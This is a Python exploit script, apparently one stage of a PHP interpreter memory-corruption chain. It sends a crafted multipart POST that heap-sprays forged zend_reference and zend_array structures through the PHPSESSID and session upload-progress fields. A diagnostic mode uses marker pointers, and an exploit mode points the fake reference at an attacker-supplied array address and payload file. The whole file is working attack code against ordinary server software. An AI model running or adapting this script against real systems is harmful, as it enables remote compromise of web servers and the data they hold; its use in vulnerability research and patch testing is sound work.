#!/usr/bin/env python3
# Vendored from de0/ so the pure chain is self-contained.
"""Repo-style fake-reference B for the display_errors=Off chain.

The request carries a spray of VL-byte values whose data holds a fake
zend_reference every 32 bytes, plus an `ht` field that carries the fake
zend_array.  A second spray keeps the request's temporary 384-byte buffer
stable.  In diagnostic mode the reference has rc=2 and a marker pointer so
the destructor only decrements it; in exploit mode rc=1 and ptr is the fake
array address.

usage (diagnostic):
  python3 fake_ref_b.py --port 18098 --vl 384 --n1 500 --n2 495

usage (exploit):
  python3 fake_ref_b.py --port 18098 --vl 384 --n1 500 --n2 495 \
      --rc 1 --ht-addr 0x7f... --ht-file payload.bin

The fake reference layout (relative to its 32-byte slot):
  +0x00 rc (4)          = --rc (default 2 diagnostic / 1 exploit)
  +0x04 type (1)        = 0x0A (IS_REFERENCE)
  +0x08 ptr (8)         = --ht-addr, or --ptr marker in diagnostic mode
  +0x10 val.type (4)    = --val-type (default 0x0107; byte 0x11 != 0)
"""
from __future__ import annotations

import argparse
import socket
import struct
import sys


def fake_ref(ptr: int, rc: int, val_type: int) -> bytes:
    rv = bytearray(32)
    struct.pack_into("<I", rv, 0, rc)
    rv[4] = 0x0A
    struct.pack_into("<Q", rv, 8, ptr)
    struct.pack_into("<I", rv, 16, val_type)
    return bytes(rv)


def make_spray(vl: int, ptr: int, rc: int, val_type: int,
               ref_start: int, ref_step: int) -> bytes:
    v = bytearray(b"S" * vl)
    o = ref_start
    while o + 32 <= vl:
        v[o:o + 32] = fake_ref(ptr, rc, val_type)
        o += ref_step
    return bytes(v)


def make_name(prefix: bytes, i: int, nlen: int) -> bytes:
    b = (prefix + ("%09d" % i).encode())
    return (b + b"x" * nlen)[:nlen]


def main() -> int:
    ap = argparse.ArgumentParser(
        description="fake-reference B (repo-style spray) for display_errors=Off")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--vl", type=int, default=384,
                    help="spray value length in bytes (default: 384)")
    ap.add_argument("--n1", type=int, default=500,
                    help="spray fields before ht (default: 500)")
    ap.add_argument("--n2", type=int, default=495,
                    help="spray fields after PHPSESSID/PROGRESS (default: 495)")
    ap.add_argument("--name-len", type=int, default=10,
                    help="field-name length; 10 -> bin-40, 3 -> bin-32 (default: 10)")
    ap.add_argument("--rc", type=int, default=2,
                    help="fake-reference refcount (2 diagnostic, 1 exploit)")
    ap.add_argument("--ptr", type=lambda x: int(x, 0), default=0xDEADBEEFDEADBEEF,
                    help="fake-reference ptr when --ht-addr is not given")
    ap.add_argument("--ht-addr", type=lambda x: int(x, 0), default=0,
                    help="fake array address used as the fake-reference ptr")
    ap.add_argument("--val-type", type=lambda x: int(x, 0), default=0x0107)
    ap.add_argument("--ref-start", type=int, default=8)
    ap.add_argument("--ref-step", type=int, default=32)
    ap.add_argument("--ht-file", default="",
                    help="raw bytes for the ht field (the fake zend_array)")
    ap.add_argument("--ht-marker", type=lambda x: int(x, 0), default=0xDEADBEEFCAFEBABE)
    ap.add_argument("--sid", default="a" * 32)
    ap.add_argument("--progress", default="k0")
    ap.add_argument("--boundary", default="C" * 10)
    ap.add_argument("--timeout", type=float, default=60.0)
    ap.add_argument("--save-response", default="")
    args = ap.parse_args()

    ptr = args.ht_addr if args.ht_addr else args.ptr
    if args.ht_file:
        with open(args.ht_file, "rb") as fh:
            ht = fh.read()
    else:
        ht = struct.pack("<Q", args.ht_marker) + b"H" * max(0, args.vl - 8)
    spray = make_spray(args.vl, ptr, args.rc, args.val_type,
                       args.ref_start, args.ref_step)
    boundary = args.boundary.encode()

    def part(name: bytes, value: bytes) -> bytes:
        return (b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")

    body = bytearray()
    for i in range(args.n1):
        body += part(make_name(b"s", i, args.name_len), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", args.sid.encode())
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", args.progress.encode())
    for i in range(args.n2):
        body += part(make_name(b"t", i, args.name_len), spray)
    body += b"--" + boundary + b"--\r\n"
    body = bytes(body)

    req = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" %
           (args.path, args.host, args.port, args.boundary, len(body))).encode()

    resp = bytearray()
    try:
        s = socket.create_connection((args.host, args.port), timeout=args.timeout)
        s.settimeout(args.timeout)
        try:
            s.sendall(req + body)
            while len(resp) < 1 << 20:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp.extend(chunk)
        except OSError:
            pass
        s.close()
    except OSError as exc:
        print("connect_error %r" % (exc,), file=sys.stderr)
        return 2

    if args.save_response:
        with open(args.save_response, "wb") as fh:
            fh.write(bytes(resp))
    status = bytes(resp).split(b"\r\n", 1)[0][:40].decode("latin1", "replace")
    print("vl=%d n1=%d n2=%d name_len=%d rc=%d ptr=%#x ht=%d resp=%d status=%r" %
          (args.vl, args.n1, args.n2, args.name_len, args.rc, ptr,
           len(ht), len(resp), status))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
